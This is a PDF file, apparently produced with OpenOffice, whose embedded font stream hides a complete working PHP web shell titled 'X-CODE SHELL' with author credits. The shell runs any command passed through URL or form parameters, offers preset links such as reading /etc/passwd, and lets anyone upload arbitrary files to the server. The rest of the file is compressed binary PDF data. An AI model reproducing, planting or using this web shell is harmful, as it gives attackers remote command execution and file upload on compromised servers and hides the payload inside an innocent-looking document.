%PDF-1.4
%äüöß
2 0 obj
<</Length 3 0 R/Filter/FlateDecode>>
stream
x���
�0Ew}����+'�0����[�Сt�c+4K�r��:脿�ap�G��LS���ˆ��g��Es�Q��).�;oO��>�bA
"z�`���E��9�ajؙ{�ٴ`o�/nd�v�g:VZh��� �
endstream
endobj

3 0 obj
130
endobj

5 0 obj
<</Length 6 0 R/Filter/FlateDecode/Length1 24420>>
stream
x��|{\\յ����y2����5���!@^$!a�&f23I��ZkC���Z���ڨm����hk���>��j���īm�6m�F{[
���ρ@Lm������ek���^{���k�Á	G������w�(JN4����Ի5,>��Vl������o��
��|@�{��N�� ��A��/�rg,����h	m3�*�;�C��p��;�p	�k�]5���|Y,�a;���a�u��K��9A�{?���%l?
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
  <meta name="generator" content="Jekyll v4.1.1">
  <title>X-CODE SHELL</title>

  <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/cover/">

  <!-- Bootstrap core CSS -->
  <link href="https://getbootstrap.com/docs/4.5/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>


  <style>
    .bd-placeholder-img {
      font-size: 1.125rem;
      text-anchor: middle;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    @media (min-width: 768px) {
      .bd-placeholder-img-lg {
        font-size: 2.5rem;
      }
    }
  </style>
  <link href="https://getbootstrap.com/docs/4.5/examples/cover/cover.css" rel="stylesheet">
</head>
<body class="text-center">
<!--
    Shell Coded By : Kurniawandata
    Kontributor 1 : Lutfi Anam
    Kontributor 2 : Arikun1337

    Kurniawandata : https://github.com/kurniawandata
    Lutfi Anam : https://github.com/lutfianam
    Arikun1337 : https://github.com/imyhacker

-->
  <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
    <header class="masthead mb-auto">
      <div class="inner">
        <h3 class="masthead-brand">X-CODE SHELL</h3>
        <nav class="nav nav-masthead justify-content-center">
          <a class="nav-link" href="?">Home</a>
          <a class="nav-link" href="?shell">Shell</a>
          <a class="nav-link" href="?inject">Upload</a>

          <div class="nav-link dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown" style="text-decoration: none">CEK</a>
            <div class="dropdown-menu">
              <a href="?cmd=uname -a" class="dropdown-item">Kernel</a>
              <a href="?cmd=lsb_release -a" class="dropdown-item">Distro</a>
              <a href="?cmd=php -v" class="dropdown-item">Versi PHP</a>
              <a href="?cmd=lscpu" class="dropdown-item">CPU</a>
              <a href="?cmd=free" class="dropdown-item">RAM</a>
              <a href="?cmd=cat /etc/passwd" class="dropdown-item">USER</a>
            </div>
          </div>
        </nav>
      </div>
    </header>

    <main role="main" class="inner cover">
       <header>
    <h1 class="title">X-code PHP Shell v0.2</h1>
    <p>For Ethicial Hacking</p><br>
  </header>
      <?php
      if (empty($_REQUEST)) {
      echo '<br>';
      
    } ?>
    <?php

    if (!empty($_GET['cmd'])) { 
    ?>
  <div class="form-group">
      <pre>
    <textarea class="form-control" id="exampleFormControlTextarea1" rows="10">
<?= system($_GET['cmd']); ?>
    </textarea>
</pre>
  
</div>
  <?php

  } 

  if(isset($_GET['inject'])) { 
  if(isset($_POST['cekfile'])) {
  move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
  echo '
<script type="text/javascript">
  Swal.fire({
  title: "Success !",
  text: "Success Upload",
  icon: "success",
  confirmButtonText: "Ok"
})

</script>
 <meta http-equiv="refresh" content="1;url=?inject" />
  ';

} else {
echo '
  <form enctype="multipart/form-data" action="" method="post">

<div class="row">
  <div class="col-md-9">
    <div class="custom-file mb-3">
    <input type="file" class="custom-file-input" id="validatedCustomFile" required>
    <label class="custom-file-label" for="validatedCustomFile">Choose file...</label>
  </div>
  </div>
  <div class="col-md-3">
    <input name="cekfile" type="submit" class="btn btn-outline-success btn-block" value="Upload">
  </div>
</div>
</form>


';
} 
} 

if(isset($_GET['shell'])) { 
if(isset($_POST['x'])) {
echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action=""  method="POST">
  
  <div class="row">
    <div class="col-md-8 mt-3 form-group">

      <input type="text" class="form-control" name="x" value="ls -l">
    </div>
    <div class="col-md-4 mt-3 form-group">


      <input type="submit" class="btn btn-outline-secondary "  value="Execute">
    </div>
  </div>

</form>';
?>
<div class="form-group">
  <textarea class="form-control" rows="3" readonly><?= `{$_POST['x']};` ?> </textarea>
</div>
<? die(); ?>
<?php 
} else {
echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">

  <div class="row">
    <div class="col-md-8 mt-3 form-group">

      <input type="text" class="form-control" name="x" value="ls -l">
    </div>
    <div class="col-md-4 mt-3 form-group">


      <input type="submit" class="btn btn-outline-secondary btn-block" value="Execute">
    </div>
  </div>

</form>';
} 
}
?>
</main>

<footer class="mastfoot mt-auto">
  <div class="inner">
    <p>Shell By <a href="https://xcode.or.id"> Kurniawan X-code</a></p>
  </div>
</footer>
</div>


<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>


</body>
</html>
P8���}�hͧ���7�������J�^��CTI�/(�*�F������������	V���o#�3�2��b38f6EO������N��@&�%%������C+�	���X'ρ�h���Il��RH"
�^�k ��Ӑ��1�<M�D����e3|>z����߅cd���"ės�ą+���$ȉ�4�
���!�у���Bd�v��`<�%̈́x�\O�;t�.�\��n��p~A�[
��W4�aG�O��������/���<J<ǹB�A�DȂ+`
x����*�'%�;�]���_8�4�B9\���v���2�
��RA�A��������Fa��7P{��p���.�KBm%A.�Ǿݰ�?'I3� �ɓ�>E�L]4!j��.�<hG	�����9R�<�����t!�(=���'���
����_$�7���ѫ�E����Upl?l�1�&Z�)�!��|�i����#�6���Q�Y�eoA�u8�.��L��2�2����*���%d7��L�Wɫ���s[����9�W�"�"Z�3%B:�뀫a-p#j���߇�G�1�,R�;z��-����;������>R|n���{3F'@�^��0
�A-��$��d	��P�I�Q>�7������������O��	Aa���b�£د�̼̌m�~h�P�\ِ�P��ӏ޴�����&��;�_�{a?��	x~��?���Qf�>�^w��{���I�#�y�|@/.�nW�5pK�����Nr/s���|/��߁׽��UA�*J�Z�إxP��*G�\գ~��3���w�cfRf>5s�̓3��n����N(�B��V����}x}=�<����Lֿ�(��-āސ�V�#��
�V���Z���d#^�C��Nv�ϐ��g���������|���{�^� ��o���_8tb�Govr�\W�;m��q-�Z�8?^.�mE=���r/����/�=�����S�K��N���Za�0 �,�^^>T�M�AŽ���Ve�r�r��n��;ʏTJU��Gu��%UT��l�c���)�Hy��	�u�)�P�J֣Ɣ\?����\�O��"y�L�>~s�~~)�_��l�� �MQ���m%��7�s��3i��%9���8?��)Y^}Q07+��~	5�
�8�#�f�����Fq/9���{D�4�0�o徂�~���]�.�+>��ۊ�P�Wr�'y�K½������%wa��)Y)dr�r�d?f��$ΐ- _7y���L!��U���������v���*#��̤�;˭�W��+�,�s�FxR��3�����;�l�iM�M^$�`��`�?7�8�؊W������a-C'��`l��v���1���C1w7\�A�0������4�E$�eʶϋD.sa��_���Ŭ�L�cD��:9��Mh��ԍ�w^}Љ�����/BIę{���������(�F�O�G�E��[p��g�����s��P�+1�[���y��n����Z�g�3��~�vk�7GwAW���50���a����Ep���۠p	��c�!?���u���rx
���X��x}%�R�L���Y�-�0�>2PC=x��
��G��r�8�ͬ�F��<�N�U��6����f��a�J��g�+�����+��]\S]U���������� ߕ������td�E[zZ�5%ْ��o�3b���F�R*�#���X�-F��#B�c���vx���G莈HZ��'"v36q!�9�/�tK��9Nbk�� _lr���6:�i���v�oott��3_��I����q��dl#�[l�,�:8��݈���68�ڂ|8��A4�H�#p�$]I�%5��@�G�")�ƦH���J��M��H�U�M�V��� ?Bz=p,�\��2eCDŖ}t7�K<�|��i#�t�t}�>�5���A׈sẍ��mo[.4qrSC���{��D��'���ĭbd�U��{�����9"�si��R\�6Ta�:��n�h��[pA����Iڝ��D)ݛĈƱ�18��
�2���������iHi'���H����iL=��k�%����=��q�Z�dD���x����)ּvN��J�X��{E��݁{����
&z��
?GE������{�X�t#Q8�q�}@�;��a!�#S�N��@Q�%s����x�����QQ5�EQ�+Y�� �4q�"V�>hE�z:j�P�v;5��i7�`#���v�-B�u
�E���M{�����Ӟ�=sû�Ǐ��sD�5�c0&�7
�DH�'t{���u���6��Mݲn�������>#R*<"8QS+�zk7�S�(�KM���j(c$����r�Yy6��5s3�F���%8�����Ujt`F!�҈�{�Tvh��s�t�,Ū��=Ej\ۋ�����Q`!�kn�81�]з����R��t�{�3�������|;�>h��5�t��.kd�m��ARS��:��/|2V���y���7��'�@!Ls?x���"�	$���'���䂆l&ׂ�e���|������k�q�GX����qN,�������
����C����0�SY&|�^�I/"E\_d��pO����MG�3Ũ�Ib�����������o�w�<�?�kt|���-�[`E���i�#Xq��r���#�W9�<��N��c$�i���n�=����ܹ	�a�� �Ƈ�[\]���"Y�Z�B����p��Z\�����3k����>sn��;��\���֝�ù3�x���3%�
�n�lU�TΔ���D�Ҫ)��u���h���k����禛ȖNn�$���,G��3'��JU&)���UQn�,+MBR��J������w�k7l=s�g���Ϝ}l��щ#���_ڝg�&��(6ϔ�8�s��S�3���P����q���H�c����h�����Q�� ����L;����#�x;��aګ��wZ�\Ӕx��r�f��U���.�l
��E{l�i�3)��FV��NP%9�1&a:z��2�Ե�-���l���0)D���;ݺ=:Nא����t�>�ٹ%�j���kƣj�A]���6a���A����-z�������qH�Kу��w��Z�5��t@ݙ�3L��H����9S��NeV�!Aĝ��$Q��E�X��(+��9&I�d��Y�iH��l�-��4���F�Q�6���m��G-���ΎN�ĘwkR�q�V3����j:SA���JG5��EIJ%�M[Q�����7o=��Ķ��_W�yɞ�xn�-��{��O�c߮Gn��X}ݽ��d捽�q��n�����ڭ���5��
uE7Z������"P1Y�(@�3|�"�H��
.RA��p��OS'���y�;.#77=se�:7=v�#-7�1�Ǻ%�y���%���(-S��s�L��`��&%f�&�$�&u@�G}B-���ﻭ�ei�y������@��#w27��C�1�˥>�IH,��.`;M.46M
��3�/�[m\u��g>"�S�3�,ɼRp&�I�D��(RR��kY�t�I�@'A��Ee���踄���2����΢��r�%�|"%QZ���4����!116�d���xw�V�_=�5&��yfq���-%5�@\ܙ��7�^?3~�-9533;��B�n�򙙴��4kf��>Ҷoy�!3@���3W+<�w�/}�w����tq\]�=q�$?a~"q:��d՞4�3���Z�]�.��ܝْm�͖���"�����ba�Xݩ�/�8��U��
1�'̧�2�fo��y��&p��:�+,J��qi��A���Ov��7�G��ǟ�?���Nݿ�A��:�ub�`bCS���-�z��%U����07m	b�r��2�#.�e�2��YYq��E��J�����r�W�e;v4��}�2T��+<9�������27�������'��gyQ[z���*�������З�Uԗ
NC֎��*!Ru��d�R�֪���%��������I\����2C��n\����gI\�]X_�^�H��E�i��*;++.ΨM�dj&�$�%m@�G{B+h�;��Yh+h-�.;
&�H�c����BAw�伝���&��*�J�5+U��JT�Uڬ���D��܂�����/=Ѓ%*&�yLV�?S�&`����g�4�K�����d�Js�ҙ�+	�asQ,1)�8߳�i�5���<~�ha^l\Cﺶ��e&��B[ff��j�7�����7�oOQs��I���ٷH#h��"�n�1�ӮW�]�
�j?>�j��r�j�z�b�r�j�Z��j�8�]��&Yn�ڪJ�Y��J;�QJ�ª��Y��t�5��p��h�:A�N����I�Ȃc�3ͽ�vfc�LLRg�r�\�Źn�hr'�J�����*��&��Z��HO���#���5���o���`�4��5U���L��C��3����Zrz4z<��8G!�pP�9,��(;+;�ᨰ��~r��ַ��N����7�V�/.9��-ˢ���+�?�)M�M
��{������Ι
�d���,��C>�rWGދ��=p*��|�~ݝ<�I�3���{3�f*���L�M�Ḻ�JK�Y]U#��R�p��]��R�q�2C��n�h�N��퍺d]���(�2t�x�vRC4�<�j����PW�o�����L��Um���E5���j!ݖ�eҲ�r֢�L9���u���9��L�ug��f�#%��!�
�NJ�)�����9w_$�Wv�ܼŋ��jߘ\R?��Phը�SRsbI���Q���x�~^�P���R��x��/&ӴL�
ԣ�h��}o2�x��$>���ni9��5Ջ�IҔ�oQkq'�&u'�&��"�J���Z�Arӕَ�l}}|zB�@������itL)��'u�UG�uݤn���N��J��)g��^P&VB�8Pw>��O'�/���+L��YRr�H����7T��]���-c!�޲
����H�4���l��t&wCw�˼"YL�NBHt�Vۨ�چ��jv+G��rr��Sy��Ve��=��Į���O���Q�4j�¼B���My�n�xK���~�����W
��q��M���6���nU�:�ڡکyR��Y�N *�g9^sʕ����E���2M���k��pAng���{⿥��vZ}X����wZwN��>�"�:��Dդj�*�T7	P�h��ƛ�M]���=x
f��E��
�ɩ�j�ޙ���+���j�$&�+�:�T��Չ9�jC"�'nOܝ�'�KHء&��I5W�ޭ>���j�����O����Ě�I����Mű���Xb��b,6�Ĳ�Tf��
�kK0���vFtbus����Π�㪋:ڧ�f��A��HT5����9���Q%���A=�} ���GA���8�u��j=��iN�J����J-��'��RK+�4����T�����b\��=��kާ#^�$?�`hr�����i�b!�|���ݺ����ٻ����#_}����!�1�wѺ���χý�%�|��W�#���SӞY��	���'�����|��(�(_��(*������s�_NU�[��y,�u�멯e*����9Y�����9Ņ�}ف��1OII�MmN�e��V�C9���W�^�|5����2��nGZ���=�ج*��`���H���r�-L�*s^Nb��S��&H1���S)���,��*���#�ܞ���'��|�a����p����CƵ�2��4�?�\݀f��޵��>��#�����3��jz�H����I�gNVnRV�L�";9��8����gÛn�m�ncz���X,d����.ڀл4{p�$�^O����&z2�&��5;1�=y��B�������ce�	���e��G~>��OJ��k�����me�ܧgFw����*[��X�ԶN�.�j������x��@1��L�{��O�Xc�>g���F�V�ք[�w��c~��L�KF�%Δ��Ϋ��֔ϧs9j��
��ͪ�;��ɶ��X=��ujm����hM�&�IaZ��M�v�A�����aO�P)�͘w�Ϛ���������Y����FgBV�!uI1c�g�@����i�.��[�*RLf�Ji�F5B�P���
����>.��+�|�ə�׷ox������Ɛ��⇶��Ή��8���ԓJ��$�L�����o?<�'�˝
ne���c��]Wѥ!{44��ݦm��a�*��[����@�������)V��K��?����vj�W'��K�o���ԅWF�7�rw ���~��S�g���9&?��j����+�&W
	X�9�B`�v-����
������݋�9���	<^O+6)~�*V[��S�%����u80Bԣw��`�Q����fJz2N ��x6*���8A�'����˸,䘌+!��\�U�
9'�j�➗q
|����k��d<���ɸ�5n�+�< ��p�q�����8C\��s��k�q���e\@��ʸtq_�q%����q�Ed\
��T�@��HƵ�~SP�c�ڜ6��"e�
2��7�w�x,Z�BI�@��K�c��Z$9��JF/`��ѫ�f�
�k���;dm�r����RFem�r����Rޗq��5^��FV������em���q�Qj����R_�q�QF����2��q�QFT��F������30<��%��p�K2�2���F�����\hʻ��	����f6��ቌ����l�.�[�$[��6�m?��L��$��~���5�Ւ��1\Z�o�1��g8ۋ���@�\Vh�q����X��m�6d�j��BX��[A�i�A��q�H����52���r��9�DX�=C0:�bo<G��J��b(��RF��CX��1(C��Z������>\�Ì&����i��r��C�
~l5�b�x����V���JZ�����p?A�	!��*��b�6ۅQҘ#ZQ�������.��I�
3�7#�J�?���T�
�f�S��ئ<ay��(��r���/��z��l����]��t�g
1���
/!��C~\��@����e�K�ƘTs����(`�f2!e\�C���Κ��
�?��"�b���a{�>ZƬ4�FIz�ղz����t���d��^h��"=��>۞��|�Kv\����m4�4�9=l� �I���1&k/�t�0�x�\}lNa#Lj!��gP�	a�0[mAL���]�z��y�\#r�?�#ƘC87�k��GX���i&�W?�2q�M{�f<�r�$۬F$�
0=y�ؾ���%��}�6ʴ�ez�d_Ȗ5�cs�΋����~"E���7_Ò�FdIG�h4����'ʙ�ױ�a������q(�H���Y�J^��e߭s1Au���Yh���]_����v��y����9�%���0"����|��Y_��Q�ai�Q�wi�V6�1�tϼ��ʲ�ӉϾ�,��q&�b;��n���#����]�Y~tA�Pii���H�Ad^)ك庡9�y�a�I7.�x��Zi�1�3�f��%��^�6�8F������V�u4?�����eY%
Q
 lc<�S��
����{�rh���V����r��l}Lf���}LCA��Y��s>��5x�P�:�W!��=�P�:E�g/�2�2���B��斢Nʏ��3�pn����c��9��*k0J�0��"4��
�[�J�g)��ބ�uXһ�ex�7��n��6Ѓ���s��'�,}p^.�Z�����){�V>�ʒo�f�q毳k���ѽpW0?���#����3�âA��yv����T�è�wȫ���*����}��%���43{O6&��4�|�r��,/ER��-�җ_�՘wA&��ُ��'g� ��ѹ��#[f��y��PS�Y�q����>9FEԜ�݇_�K��s���ҥצ�_/��ҙ2�1[HvZxO(eB�(�4듳ȿcsQ���<>0o]�;�����X:�����縃����}�'kj�e
�E9��|��e��߅��ٜw�ӏ���(�8�pn?�\��{XΒ����
��q!�.��O���X���q�͞�ҝ]h�n����Yu�"/��������^�O>K�}���2�����'ŤW>O����}܎�������Rq<k1�E���oI{A�_�W���[�%��'aϞ����{`����O����s��'�*�#�/�[���,sco	���x%>CT�Q���((���{g���d��+�H{s�a�x����������j��?�$�������?"�z�FO��/���d�:��(���#8��������B�~hH\��ĵސ7��������5�1q��3��;0:�	�.PsQ�(��l�Ct��ªR1g��7���ù��gc]��:Z׭n���!�-���{��E�'�Sz|��7��}#bYׯ[=a1Kl[-������>�;��
"[��L�!�@��O���AϘod����1
�ua�Ȑwe�B��|q��7���<�>�H�ZV�6��,TdOϐW�ڲ��EO ���2RvZ�mI�=������F�c��'�
�����ؠ�wP���1OH���|#޾BQ\��	y���C�b���?��#^:UĘ?8���(@h���
��1��ޠ��0��QApk�ϐ�'�>$����a4�8:��
^��l���2C��_�4���$�Q��t�bA��� �E�^���|[��I/�*b�����*���J-�?��A���Ts��B.a1\n�'�����Q�(���,8j�O�Eu����i4DG�z�ox��|�u�3���}���#�E�P�
��i{=A���¾ސ�3*����	��~q���{]�wh�nx}��7���£�!d����=e����W���h�ѐ�'=~��h�3�����$�z1���K�����H�=C!?c���C�q�ط���^��@MQ���Xᰬ�Bt�����P�p���f�p�+LM���YH;�́c�!��lȚ��KW4Է�hY#�,W�hhZ��I�_���iuӚ6�V�e�30d^��C��3_"dٮ|�e�u�q�(����R���t��0�0�8��Av�@���
+;pؠ���	{P�h���L6��+z}�%�G#��Z.ȅ�����R�΍C#��>t�Ŕ�s��Ba�̩bn0�q�gh��O(�
�](�ǈ�H���I΄��1����E>�s�H}|������hc�ٙ�O�A�[�K.j�7��=��Ѹ���L=��c��G{�|�A��%�{]�GS�E�Me
-\��cE����(�db�`��z�#���܌94��`
z���@�>���S>���T�E�7�Gc�_�1ݘG�����2���b~���N��x�5�a��z<Tr��+s�ʒ�����b�f}3�KJ�˱�,�+UTWT���$�>1i�H��!>,��c&},���D�����]v�2�7�˿>�w�W�����'�����/�X��b�����/V�����/V.�X��b�����/V.�X��b�����/V.�X��b���+~�q�0�K��y���ߋHwޗ�s�y����.���2�
,��@s�?�e
��{�������dg����pi|���!j��/�9=οy����=�����S9���c*%�������xNؐpj*��zޘZ�DFUIȡ���S�Z�
�ǿ��B?c������#��7����^��A��Ϳv(3�t�����,�JJ�=3��+�	�L`������Çb�J�>���cy�4�Y����a7�X��Z(����G9��?eǲ���A�6�;H�LK�!~d����;���.�K���)X��X߇mZ���_Ú�U�߃�D����� ݊�]��l����V~����^>4�n3֧c��P��#v'bw����ƒ�7�Cl��X�b=,ը���f�%%��E�ހ��5wj��
���<�K<���s=�\�<ףV�����ʀ�AD�Q�!�;�G�<�p��?��$�^���P��(�N~�T�
�l�P����1�U���%������h�#b+���e��C�z��I5rm���{��$`��P�Ј ��S�E�c�V�;ֶ���o�+��Fbz�/�V5�K���E�\[W-���4;4�Q#j�5nM�F�����y���u|��+���j����,S֔M�썉��9��(�+O*O+�*��X�V�*�����r�R3��Tq�1��1�1F�)�qǴ�(l*������+�F���$��:�B��_�Ѕ��BU\�t��eD8��i��2 ��H5 �����zZ�r�r�gv�?K{��7���Ncy�b+��ǖ[z�:�}��ZxF;��^��l_��ߍ�d�g�l����>r{����H.ٛK&s�����ԝ���d�rt9�r��	~������Z-Ζ��}B���Y�S�O(r9�r��	6��i˱�v�:���U'V	]������+���N��KY���������JC���N�{N!�`�҆P�P��GPp��>��G��A���)K��G�{X�h?�����?<US�R�
�n��~�f�v��#X�f��/�S.��8�7�t��p#�!t!p��N!��X�~#^W�Ws���0�0��֗�m���Ǉ)Nm�7r:�=y��w�r'+�X���]��`��+��[��F����MO�d��S��^�R�ϭ��lI`=gf����=V�ae�;����]�W���v�7��-v�v:.cX�%�2���.V�de�;Ʀڦ�ڦ������^���V���JK��G
��<F��8��͵Ms�*����jf�vV��j���S�_�=N�N��F>��|�Vo&��
���*�&+`?�g����%N��5U{����߄5��Zٸ=d�C����\�kS����W!�������������X}q*��SN*঩�<[}�L���������W\�3a�L�4�OG5��IÔ��l*����l9۔�m2
l�Tp0���du,10����j���&�E���m��j����a�^�[���6`�?Ɋ����RuM�N�O�����~�9M6Lَ�O�����i��D%G��#Gl�l�8X�>�����ؾ��h�ǉ�)�M��S1`w��;򯴭��o[��&������Z[�#h�Fr�4Yqh��$s��R�s�?b���L���Ǹ
P�Qw�*��QmP]�Z�*S�DU�*U��6���X�N�U��J���ԠN���v��7�(��+MZ
7r���%䈚�؉���\��%$bj���%�JW��*�6R�j��[?�~��;:��>?M����n��/�;
��r�����r{Gi����1��:܇����c���Y�LW�U/m�D�-�����2�_�]���]���#�I눔R$���YF��(���75���h?J�q[��R:���1�\�٠�V��dP6� ��*Ɔn���x0#Cbz���L�>O1�i�L\�j��q�������)��4�a�d: 6�Al�T�t��D�|'e9X�D���Jֽ�B��)��N���t�u���#���<�y\�����39��U_/�2�nG��;�k��%��G��J��¬���AZ{��_9���>G�x��{��^��q4�ަ����no����irx;=���y�Z;��j�~�ɶ���Z4_���v?@�j�k5ӵp?��j^��4��TÒ��k����x���;�$W��Xl��h=&�[1���α$�G�]�����v�ү���,7.�[����.#��K��&_��O(
Sua�0Z�־�9��~9^m��)��n�`��=*���'jO�r�����k���U��v ��DƉ�+ß�=cwƞ�J�qM�w힌?e���M$���F��(��C�����.B��s����3��z	ޡ@<��a����B�+��7c�%��Q
_�4Y|�t�M:��PqEi�4֞~�^�Q���Hum}�멺2m�o�	��Y��~��_ʗ��G%��A�EP|�]aZ�\a����;r��up���f��~$4
�
4V�Ĩ!:l�ֳ��Ү�
endstream
endobj

6 0 obj
12215
endobj

7 0 obj
<</Type/FontDescriptor/FontName/BAAAAA+TimesNewRomanPSMT
/Flags 4
/FontBBox[-568 -306 2027 1006]/ItalicAngle 0
/Ascent 891
/Descent -216
/CapHeight 1006
/StemV 80
/FontFile2 5 0 R>>
endobj

8 0 obj
<</Length 285/Filter/FlateDecode>>
stream
x�]��j�0E��
-�E�#q`���}P� K�TP�B���jFi]H���Fw��97F��Ս��{m��i����M��\i���r�%A�.���1�X�,y�ɻ��Nj���%/N����Wu�v��0������>�y�Y��jݨ��~Y�_��b��gq9*������+Ӵ���Z10�_.�DI��O�BiJ�t���Ļ+�&�yK��"����#�S�}��C>Ě#�1r�|�\ ?������c�
���>�����\���A�������hQE��Չ�
endstream
endobj

9 0 obj
<</Type/Font/Subtype/TrueType/BaseFont/BAAAAA+TimesNewRomanPSMT
/FirstChar 0
/LastChar 13
/Widths[777 666 500 500 277 500 250 556 277 277 443 556 722 250 ]
/FontDescriptor 7 0 R
/ToUnicode 8 0 R
>>
endobj

10 0 obj
<</F1 9 0 R
>>
endobj

11 0 obj
<</Font 10 0 R
/ProcSet[/PDF/Text]
>>
endobj

1 0 obj
<</Type/Page/Parent 4 0 R/Resources 11 0 R/MediaBox[0 0 612 792]/Group<</S/Transparency/CS/DeviceRGB/I true>>/Contents 2 0 R>>
endobj

4 0 obj
<</Type/Pages
/Resources 11 0 R
/MediaBox[ 0 0 612 792 ]
/Kids[ 1 0 R ]
/Count 1>>
endobj

12 0 obj
<</Type/Catalog/Pages 4 0 R
/OpenAction[1 0 R /XYZ null null 0]
/Lang(en-US)
>>
endobj

13 0 obj
<</Creator<FEFF005700720069007400650072>
/Producer<FEFF004F00700065006E004F00660066006900630065002E006F0072006700200033002E0030>
/CreationDate(D:20090723151352+07'00')>>
endobj

xref
0 14
0000000000 65535 f 
0000013415 00000 n 
0000000019 00000 n 
0000000220 00000 n 
0000013558 00000 n 
0000000240 00000 n 
0000012540 00000 n 
0000012562 00000 n 
0000012760 00000 n 
0000013114 00000 n 
0000013328 00000 n 
0000013360 00000 n 
0000013657 00000 n 
0000013754 00000 n 
trailer
<</Size 14/Root 12 0 R
/Info 13 0 R
/ID [ <F8C2562BDAC674E59FB9D8420FC9509E>
<F8C2562BDAC674E59FB9D8420FC9509E> ]
/DocChecksum /82BAFA6C63F91FE4C24982DE1817579F
>>
startxref
13941
%%EOF
